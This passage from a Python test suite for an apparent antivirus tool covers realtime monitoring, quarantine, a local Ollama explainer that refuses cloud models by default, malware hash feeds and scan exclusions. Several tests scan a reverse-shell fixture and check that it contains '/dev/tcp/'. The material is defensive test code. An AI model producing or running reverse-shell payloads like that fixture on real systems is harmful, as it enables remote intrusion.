        # well under a second.
        self.assertFalse(self.wait_for(1, timeout=2.0), "an excepted file was scanned anyway")

    def test_auto_quarantine_isolates_infected(self):
        ensure_dirs()
        quarantine = Quarantine()
        quarantine.purge()
        self.config.auto_quarantine = True
        self.start()
        target = self.write("eicar.com", EICAR)
        self.assertTrue(self.wait_for(1))
        self.assertTrue(self.found[0].quarantined_id)
        self.assertFalse(target.exists(), "infected file should have been moved to quarantine")
        quarantine.purge()

    def test_stats_are_tracked(self):
        self.start()
        self.write("eicar.com", EICAR)
        self.assertTrue(self.wait_for(1))
        self.assertGreater(self.monitor.stats.events, 0)
        self.assertGreater(self.monitor.stats.scanned, 0)
        self.assertEqual(self.monitor.stats.threats, 1)
        self.assertGreaterEqual(self.monitor.stats.watches, 1)

    def test_stop_is_idempotent_and_releases_watches(self):
        self.start()
        self.monitor.stop()
        self.monitor.stop()
        self.assertFalse(self.monitor.running)

    def test_missing_paths_raise_rather_than_watch_nothing(self):
        config = Config.load()
        config.realtime_paths = [str(self.tmp / "does-not-exist")]
        with self.assertRaises(RealtimeError):
            RealtimeMonitor(config).start()

    def test_debounce_collapses_repeated_writes(self):
        monitor = RealtimeMonitor(self.config)
        self.assertFalse(monitor._debounced("/tmp/x"))
        self.assertTrue(monitor._debounced("/tmp/x"))
        self.assertFalse(monitor._debounced("/tmp/y"))


# ------------------------------------------------------------------ assistant

class MockOllama:
    """A stand-in Ollama host that speaks enough of the API to test the client.

    Used instead of a real model so the assistant tests are deterministic,
    offline, and send nothing anywhere.
    """

    def __init__(self, models=None, chunks=None, fail_chat=False):
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
        import threading as _threading

        self.models = models if models is not None else [
            {"name": "llama3.2:3b", "size": 2_000_000_000},
        ]
        self.chunks = chunks or ["Hello", " from", " the", " model."]
        self.fail_chat = fail_chat
        self.last_payload = None
        mock = self

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *_args):
                pass

            def do_GET(self):
                if self.path != "/api/tags":
                    self.send_error(404)
                    return
                body = json.dumps({"models": mock.models}).encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def do_POST(self):
                if self.path != "/api/chat":
                    self.send_error(404)
                    return
                length = int(self.headers.get("Content-Length", 0))
                mock.last_payload = json.loads(self.rfile.read(length) or b"{}")
                if mock.fail_chat:
                    self.send_error(500, "model exploded")
                    return
                self.send_response(200)
                self.send_header("Content-Type", "application/x-ndjson")
                self.end_headers()
                for chunk in mock.chunks:
                    line = json.dumps({"message": {"content": chunk}, "done": False}) + "\n"
                    self.wfile.write(line.encode())
                    self.wfile.flush()
                self.wfile.write((json.dumps({"message": {"content": ""}, "done": True}) + "\n").encode())

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        # serve_forever polls at 0.5s by default, which shows up as a flat 0.5s
        # shutdown cost on every single test that spins up a mock.
        self.thread = _threading.Thread(
            target=self.server.serve_forever, kwargs={"poll_interval": 0.01}, daemon=True
        )
        self.thread.start()

    @property
    def url(self):
        return f"http://127.0.0.1:{self.server.server_address[1]}"

    def stop(self):
        self.server.shutdown()
        self.server.server_close()


from br1zz_security.assistant import Explainer, ExplainerError  # noqa: E402
from br1zz_security.assistant.ollama import ModelInfo, OllamaBackend, OllamaError  # noqa: E402
from br1zz_security.assistant.explain import build_prompt, read_excerpt  # noqa: E402


class OllamaBackendTests(unittest.TestCase):
    def setUp(self):
        self.mock = MockOllama()
        self.addCleanup(self.mock.stop)
        self.backend = OllamaBackend(host=self.mock.url, model="llama3.2:3b", timeout=10)

    def test_lists_models(self):
        self.assertEqual([m.name for m in self.backend.models()], ["llama3.2:3b"])

    def test_available(self):
        self.assertTrue(self.backend.available())

    def test_unreachable_host_is_not_available(self):
        backend = OllamaBackend(host="http://127.0.0.1:1", timeout=2)
        self.assertFalse(backend.available())
        with self.assertRaises(OllamaError):
            backend.models()

    def test_chat_streams_and_reassembles(self):
        self.assertEqual("".join(self.backend.chat("sys", "user")), "Hello from the model.")

    def test_chat_sends_system_and_user_messages(self):
        list(self.backend.chat("SYSTEM TEXT", "USER TEXT"))
        messages = self.mock.last_payload["messages"]
        self.assertEqual(messages[0], {"role": "system", "content": "SYSTEM TEXT"})
        self.assertEqual(messages[1], {"role": "user", "content": "USER TEXT"})

    def test_chat_error_is_wrapped(self):
        mock = MockOllama(fail_chat=True)
        self.addCleanup(mock.stop)
        backend = OllamaBackend(host=mock.url, timeout=5)
        with self.assertRaises(OllamaError):
            list(backend.chat("s", "u"))

    def test_localhost_is_reported_local(self):
        self.assertTrue(OllamaBackend(host="http://localhost:11434").is_local)
        self.assertTrue(OllamaBackend(host="http://127.0.0.1:11434").is_local)

    def test_remote_host_is_not_local(self):
        self.assertFalse(OllamaBackend(host="http://ai.example.com:11434").is_local)

    def test_cloud_tag_is_flagged(self):
        self.assertTrue(ModelInfo("minimax-m3:cloud", 0).is_cloud)
        self.assertFalse(ModelInfo("llama3.2:3b", 2_000_000_000).is_cloud)

    def test_resolve_prefers_configured_model(self):
        mock = MockOllama(models=[
            {"name": "qwen2.5:3b", "size": 2e9}, {"name": "llama3.2:3b", "size": 2e9},
        ])
        self.addCleanup(mock.stop)
        backend = OllamaBackend(host=mock.url, model="llama3.2:3b")
        self.assertEqual(backend.resolve_model(), "llama3.2:3b")

    def test_resolve_matches_family_when_tag_differs(self):
        mock = MockOllama(models=[{"name": "llama3.2:1b", "size": 1e9}])
        self.addCleanup(mock.stop)
        backend = OllamaBackend(host=mock.url, model="llama3.2:3b")
        self.assertEqual(backend.resolve_model(), "llama3.2:1b")

    def test_resolve_prefers_on_device_over_cloud(self):
        mock = MockOllama(models=[
            {"name": "aaa-model:cloud", "size": 0}, {"name": "zzz-local:7b", "size": 4e9},
        ])
        self.addCleanup(mock.stop)
        backend = OllamaBackend(host=mock.url, model="not-installed")
        self.assertEqual(backend.resolve_model(), "zzz-local:7b")

    def test_resolve_with_no_models_explains_how_to_fix(self):
        mock = MockOllama(models=[])
        self.addCleanup(mock.stop)
        backend = OllamaBackend(host=mock.url)
        with self.assertRaises(OllamaError) as ctx:
            backend.resolve_model()
        self.assertIn("ollama pull", str(ctx.exception))


class ExplainPromptTests(TempDirTest):
    def setUp(self):
        super().setUp()
        self.scanner = Scanner(Config.load()).load()

    def test_prompt_contains_detection_details(self):
        verdict = self.scanner.scan_file(self.write("rs.sh", REVERSE_SHELL))
        prompt = build_prompt(verdict, excerpt=None)
        self.assertIn("rs.sh", prompt)
        self.assertIn("infected", prompt)
        self.assertIn("ReverseShell", prompt)
        self.assertIn("severity", prompt)

    def test_excerpt_included_for_text(self):
        path = self.write("rs.sh", REVERSE_SHELL)
        self.assertIn("/dev/tcp/", read_excerpt(path))

    def test_no_excerpt_for_binary(self):
        path = self.write_bytes("prog", b"\x7fELF\x02\x01\x01" + b"\x00" * 400)
        self.assertIsNone(read_excerpt(path))

    def test_excerpt_is_truncated(self):
        path = self.write("big.txt", "A" * 50_000)
        excerpt = read_excerpt(path, limit=500)
        self.assertLessEqual(len(excerpt), 600)
        self.assertIn("truncated", excerpt)

    def test_missing_file_excerpt_is_none(self):
        self.assertIsNone(read_excerpt(self.tmp / "nope.txt"))


class ExplainerTests(TempDirTest):
    def setUp(self):
        super().setUp()
        self.mock = MockOllama(chunks=["WHY IT WAS FLAGGED\n", "It opens a reverse shell."])
        self.addCleanup(self.mock.stop)
        self.config = Config.load()
        self.config.assistant_host = self.mock.url
        self.config.assistant_model = "llama3.2:3b"
        self.scanner = Scanner(self.config).load()

    def test_explains_a_verdict(self):
        verdict = self.scanner.scan_file(self.write("rs.sh", REVERSE_SHELL))
        text = "".join(Explainer(self.config).explain(verdict))
        self.assertIn("reverse shell", text)

    def test_status_reports_ready(self):
        info = Explainer(self.config).status()
        self.assertTrue(info["reachable"])
        self.assertEqual(info["model"], "llama3.2:3b")
        self.assertFalse(info["cloud_model"])

    def test_status_flags_cloud_model(self):
        mock = MockOllama(models=[{"name": "minimax-m3:cloud", "size": 0}])
        self.addCleanup(mock.stop)
        config = Config.load()
        config.assistant_host = mock.url
        config.assistant_model = "minimax-m3:cloud"
        info = Explainer(config).status()
        self.assertTrue(info["cloud_model"], "a :cloud model must not be reported as on-device")

    def test_cloud_model_is_refused_by_default(self):
        # The assistant is offered as on-device; sending data off-machine must
        # be an explicit choice, not a warning printed while already sending.
        mock = MockOllama(models=[{"name": "minimax-m3:cloud", "size": 0}])
        self.addCleanup(mock.stop)
        config = Config.load()
        config.assistant_host = mock.url
        config.assistant_model = "minimax-m3:cloud"
        verdict = self.scanner.scan_file(self.write("rs.sh", REVERSE_SHELL))
        with self.assertRaises(ExplainerError) as ctx:
            list(Explainer(config).explain(verdict))
        self.assertIn("cloud-routed", str(ctx.exception))
        self.assertIsNone(mock.last_payload, "no request may be sent to a cloud model")

    def test_cloud_model_allowed_when_opted_in(self):
        mock = MockOllama(models=[{"name": "minimax-m3:cloud", "size": 0}],
                          chunks=["explained"])
        self.addCleanup(mock.stop)
        config = Config.load()
        config.assistant_host = mock.url
        config.assistant_model = "minimax-m3:cloud"
        config.assistant_allow_cloud_model = True
        verdict = self.scanner.scan_file(self.write("rs.sh", REVERSE_SHELL))
        self.assertEqual("".join(Explainer(config).explain(verdict)), "explained")

    def test_on_device_model_is_not_blocked(self):
        verdict = self.scanner.scan_file(self.write("rs.sh", REVERSE_SHELL))
        self.assertTrue("".join(Explainer(self.config).explain(verdict)))

    def test_disabled_assistant_raises(self):
        config = Config.load()
        config.assistant_enabled = False
        verdict = self.scanner.scan_file(self.write("rs.sh", REVERSE_SHELL))
        with self.assertRaises(ExplainerError):
            list(Explainer(config).explain(verdict))

    def test_unreachable_backend_raises_explainer_error(self):
        config = Config.load()
        config.assistant_host = "http://127.0.0.1:1"
        config.assistant_timeout = 2
        verdict = self.scanner.scan_file(self.write("rs.sh", REVERSE_SHELL))
        with self.assertRaises(ExplainerError):
            list(Explainer(config).explain(verdict))

    def test_status_of_disabled_assistant(self):
        config = Config.load()
        config.assistant_enabled = False
        info = Explainer(config).status()
        self.assertFalse(info["enabled"])
        self.assertIn("disabled", info["error"])


# ---------------------------------------------------------------- feeds

MB_CSV = b"""\
################################################################
# MalwareBazaar recent malware samples (CSV)                   #
################################################################
#
# "first_seen_utc","sha256_hash","md5_hash","sha1_hash","reporter","file_name","file_type_guess","mime_type","signature"
"2026-08-11 05:46:57", "1e768ef07fb5576fd1e0e0f0795e9d2232d0d329fc86ef6e654a5a52318bd335", \
"60151c2dfd54f09522181f197cb21092", "db165c79f4e206c8aee9234299eb456b9d986c9a", "rep", "x.sh", "sh", "text/x-shellscript", "n/a"
"2026-08-11 05:45:52", "3687aa4cf981d249fa36cc6ba10c7b3f258cbb7fd0f63a6e6536a7aa69daf98d", \
"7c1309c2a371a9f9d2f250cbc8cd2be3", "79ced6811afcf526f0886d232021dadbf51781df", "rep", "b.arm6", "elf", "application/x-executable", "Mirai"
"""


class FeedServer:
    """Serves a fixed payload, so feed tests never touch the network."""

    def __init__(self, payload: bytes, status: int = 200):
        from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
        import threading as _threading
        mock = self
        self.payload, self.status, self.hits = payload, status, 0

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, *_a):
                pass

            def do_GET(self):
                mock.hits += 1
                if mock.status != 200:
                    self.send_error(mock.status)
                    return
                self.send_response(200)
                self.send_header("Content-Length", str(len(mock.payload)))
                self.end_headers()
                self.wfile.write(mock.payload)

        self.server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
        _threading.Thread(target=self.server.serve_forever,
                          kwargs={"poll_interval": 0.01}, daemon=True).start()

    @property
    def url(self):
        return f"http://127.0.0.1:{self.server.server_address[1]}/feed"

    def stop(self):
        self.server.shutdown()
        self.server.server_close()


class FeedParserTests(unittest.TestCase):
    def test_parses_malwarebazaar_csv(self):
        rows = feeds.parse_malwarebazaar_csv(MB_CSV)
        # Three digests per sample, two samples.
        self.assertEqual(len(rows), 6)
        names = {n for _, n, _ in rows}
        self.assertIn("Malware.Mirai", names)

    def test_missing_family_falls_back_to_file_type(self):
        rows = feeds.parse_malwarebazaar_csv(MB_CSV)
        by_digest = {d: n for d, n, _ in rows}
        self.assertEqual(
            by_digest["1e768ef07fb5576fd1e0e0f0795e9d2232d0d329fc86ef6e654a5a52318bd335"],
            "Malware.Sh.MalwareBazaar",
        )

    def test_comment_lines_are_skipped(self):
        for digest, _, _ in feeds.parse_malwarebazaar_csv(MB_CSV):
            self.assertNotIn("#", digest)

    def test_parses_plain_sha256_list(self):
        payload = b"# comment\n" + b"\n".join([b"a" * 64, b"b" * 64, b"nothex"])
        rows = feeds.parse_sha256_lines(payload)
        self.assertEqual(len(rows), 2)

    def test_rejects_malformed_digests(self):
        rows = feeds.parse_sha256_lines(b"zzzz\n123\n" + b"c" * 64)
        self.assertEqual(len(rows), 1)

    def test_handles_zipped_payload(self):
        import io, zipfile
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as archive:
            archive.writestr("full_sha256.txt", b"\n".join([b"d" * 64, b"e" * 64]))
        rows = feeds.parse_sha256_lines(buf.getvalue())
        self.assertEqual(len(rows), 2)


class SignatureStoreTests(unittest.TestCase):
    def setUp(self):
        self.path = Path(_SANDBOX, f"store-{id(self)}.db")
        self.store = feeds.SignatureStore(self.path)
        self.addCleanup(self.store.clear)

    def test_empty_store_reports_zero(self):
        self.assertEqual(self.store.count(), 0)
        self.assertIsNone(self.store.lookup(["a" * 64]))

    def test_upsert_and_lookup(self):
        added, updated = self.store.upsert_many([("A" * 64, "Malware.Test", 100)], "unittest")
        self.assertEqual((added, updated), (1, 0))
        found = self.store.lookup(["a" * 64])  # lookup is case-insensitive
        self.assertEqual(found, ("Malware.Test", 100))

    def test_reupsert_updates_rather_than_duplicates(self):
        self.store.upsert_many([("f" * 64, "Malware.Old", 100)], "unittest")
        added, updated = self.store.upsert_many([("f" * 64, "Malware.New", 100)], "unittest")
        self.assertEqual((added, updated), (0, 1))
        self.assertEqual(self.store.count(), 1)
        self.assertEqual(self.store.lookup(["f" * 64])[0], "Malware.New")

    def test_feed_state_is_recorded(self):
        self.store.upsert_many([("b" * 64, "M", 100)], "myfeed")
        state = {row["name"]: row for row in self.store.feed_state()}
        self.assertIn("myfeed", state)
        self.assertEqual(state["myfeed"]["count"], 1)

    def test_clear_removes_everything(self):
        self.store.upsert_many([("c" * 64, "M", 100)], "unittest")
        self.store.clear()
        self.assertEqual(self.store.count(), 0)

    def test_lookup_is_usable_from_threads(self):
        # The scanner queries this from a thread pool; sqlite3 connections are
        # not shareable across threads, so the store keeps one per thread.
        from concurrent.futures import ThreadPoolExecutor
        self.store.upsert_many([("d" * 64, "Malware.Threaded", 100)], "unittest")
        with ThreadPoolExecutor(max_workers=8) as pool:
            results = list(pool.map(lambda _: self.store.lookup(["d" * 64]), range(32)))
        self.assertTrue(all(r == ("Malware.Threaded", 100) for r in results))


class FeedUpdateTests(unittest.TestCase):
    def setUp(self):
        self.server = FeedServer(MB_CSV)
        self.addCleanup(self.server.stop)
        self.path = Path(_SANDBOX, f"update-{id(self)}.db")
        self.store = feeds.SignatureStore(self.path)
        self.addCleanup(self.store.clear)
        self.feed = [{"name": "test-feed", "url": self.server.url,
                      "format": "malwarebazaar_csv", "enabled": True}]

    def test_update_populates_store(self):
        results = feeds.update(self.feed, store=self.store)
        self.assertTrue(results[0].ok, results[0].error)
        self.assertEqual(results[0].added, 6)
        self.assertEqual(self.store.count(), 6)

    def test_second_update_adds_nothing_new(self):
        feeds.update(self.feed, store=self.store)
        results = feeds.update(self.feed, store=self.store)
        self.assertEqual(results[0].added, 0)
        self.assertEqual(results[0].updated, 6)

    def test_http_error_is_reported_not_raised(self):
        server = FeedServer(b"", status=503)
        self.addCleanup(server.stop)
        feed = [{"name": "broken", "url": server.url,
                 "format": "malwarebazaar_csv", "enabled": True}]
        results = feeds.update(feed, store=self.store)
        self.assertFalse(results[0].ok)
        self.assertIn("503", results[0].error)

    def test_unreachable_host_is_reported_not_raised(self):
        feed = [{"name": "dead", "url": "http://127.0.0.1:1/feed",
                 "format": "malwarebazaar_csv", "enabled": True}]
        results = feeds.update(feed, store=self.store)
        self.assertFalse(results[0].ok)

    def test_unknown_format_is_reported(self):
        feed = [{"name": "weird", "url": self.server.url, "format": "nope", "enabled": True}]
        results = feeds.update(feed, store=self.store)
        self.assertFalse(results[0].ok)
        self.assertIn("unknown feed format", results[0].error)

    def test_scanner_detects_a_feed_signature(self):
        # End-to-end: a hash pulled from a feed must produce a real verdict.
        import hashlib
        from br1zz_security.engine.hashdb import HashDatabase, Digests
        payload = b"a distinctive malicious body for the feed test"
        digest = hashlib.sha256(payload).hexdigest()
        self.store.upsert_many([(digest, "Malware.FeedTest", 100)], "unittest")

        db = HashDatabase()
        db.store, db.feed_count = self.store, self.store.count()
        hit = db.lookup(Digests(sha256=digest, md5="0" * 32, sha1="0" * 40, size=len(payload)))
        self.assertIsNotNone(hit)
        self.assertEqual(hit.name, "Malware.FeedTest")
        self.assertEqual(hit.engine, "hashdb")

    def test_builtin_feed_list_is_well_formed(self):
        for feed in feeds.load_feeds():
            self.assertIn("name", feed)
            self.assertTrue(feed["url"].startswith("https://"), f"{feed['name']} must use HTTPS")
            self.assertIn(feed["format"], feeds.PARSERS)


# -------------------------------------------------------------- config & log

class ConfigTests(unittest.TestCase):
    def test_save_and_load_roundtrip(self):
        config = Config()
        config.heuristic_threshold = 42
        config.enable_yara = False
        path = Path(_SANDBOX, "roundtrip.json")
        config.save(path)
        loaded = Config.load(path)
        self.assertEqual(loaded.heuristic_threshold, 42)
        self.assertFalse(loaded.enable_yara)

    def test_corrupt_config_falls_back_to_defaults(self):
        path = Path(_SANDBOX, "broken.json")
        path.write_text("{not valid json")
        self.assertEqual(Config.load(path).heuristic_threshold, Config().heuristic_threshold)

    def test_unknown_keys_are_ignored(self):
        path = Path(_SANDBOX, "extra.json")
        path.write_text('{"heuristic_threshold": 33, "not_a_real_setting": true}')
        loaded = Config.load(path)
        self.assertEqual(loaded.heuristic_threshold, 33)
        self.assertFalse(hasattr(loaded, "not_a_real_setting"))

    def test_quick_paths_expand(self):
        for path in Config().expanded_quick_paths():
            self.assertTrue(path.is_absolute())


class ScanExceptionTests(unittest.TestCase):
    def setUp(self):
        self.config = Config()
        self.config.excludes = []

    # ------------------------------------------------------------ normalising

    def test_home_is_stored_portably(self):
        # Stored with ~ so the config survives being copied to another machine.
        entry = normalize_exception(str(Path.home() / "Downloads"))
        self.assertEqual(entry, "~/Downloads")

    def test_trailing_and_duplicate_slashes_are_collapsed(self):
        self.assertEqual(normalize_exception("/var//tmp/"), "/var/tmp")
        self.assertEqual(normalize_exception("~/Downloads/"), "~/Downloads")

    def test_globs_are_preserved(self):
        self.assertEqual(
            normalize_exception("~/Projects/*/node_modules"),
            "~/Projects/*/node_modules",
        )

    def test_empty_and_relative_entries_are_rejected(self):
        for bad in ("", "   ", "Downloads", "./relative"):
            with self.assertRaises(ExceptionError):
                normalize_exception(bad)

    def test_whole_filesystem_and_home_are_rejected(self):
        # Both "work" and silently reduce every later scan to zero files.
        for bad in ("/", "~", str(Path.home()), "~/"):
            with self.assertRaises(ExceptionError):
                normalize_exception(bad)

    # ------------------------------------------------------------- managing

    def test_add_and_remove(self):
        self.assertEqual(self.config.add_exception("/opt/vendor/"), "/opt/vendor")
        self.assertEqual(self.config.excludes, ["/opt/vendor"])
        self.assertTrue(self.config.remove_exception("/opt/vendor"))
        self.assertEqual(self.config.excludes, [])

    def test_removing_an_absent_entry_reports_failure(self):
        self.assertFalse(self.config.remove_exception("/opt/nothing"))

    def test_duplicates_are_rejected_however_they_are_written(self):
        self.config.add_exception("/opt/vendor")
        with self.assertRaises(ExceptionError):
            self.config.add_exception("/opt/vendor/")
        self.assertEqual(self.config.excludes, ["/opt/vendor"])

    def test_entry_already_covered_by_a_parent_is_rejected(self):
        self.config.add_exception("/opt/vendor")
        with self.assertRaises(ExceptionError):
            self.config.add_exception("/opt/vendor/lib/thing.so")
        self.assertEqual(self.config.excludes, ["/opt/vendor"])

    def test_exception_for_matches_children(self):
        self.config.add_exception("/opt/vendor")
        self.assertEqual(self.config.exception_for("/opt/vendor/lib/x.so"), "/opt/vendor")
        self.assertEqual(self.config.exception_for("/opt/vendor"), "/opt/vendor")
        self.assertIsNone(self.config.exception_for("/opt/other/x.so"))

    def test_exception_list_survives_a_save_and_load(self):
        self.config.add_exception("/opt/vendor")
        self.config.add_exception("~/Projects/*/node_modules")
        path = Path(_SANDBOX, "exceptions.json")
        self.config.save(path)
        self.assertEqual(
            Config.load(path).excludes,
            ["/opt/vendor", "~/Projects/*/node_modules"],
        )


class ScanLogTests(TempDirTest):
    def test_record_and_read_back(self):
        scanlog.clear()
        scanner = Scanner(Config.load()).load()
        self.write("eicar.com", EICAR)
        summary = scanner.scan([self.tmp])
        scanlog.record(summary, kind="unittest")

        entries = scanlog.history(limit=5)
        self.assertTrue(entries)
        self.assertEqual(entries[0]["kind"], "unittest")
        self.assertEqual(entries[0]["infected"], 1)
        self.assertIsNotNone(scanlog.last_scan())

    def test_history_is_empty_after_clear(self):
        scanlog.clear()
        self.assertEqual(scanlog.history(), [])


if __name__ == "__main__":
    unittest.main(verbosity=2)
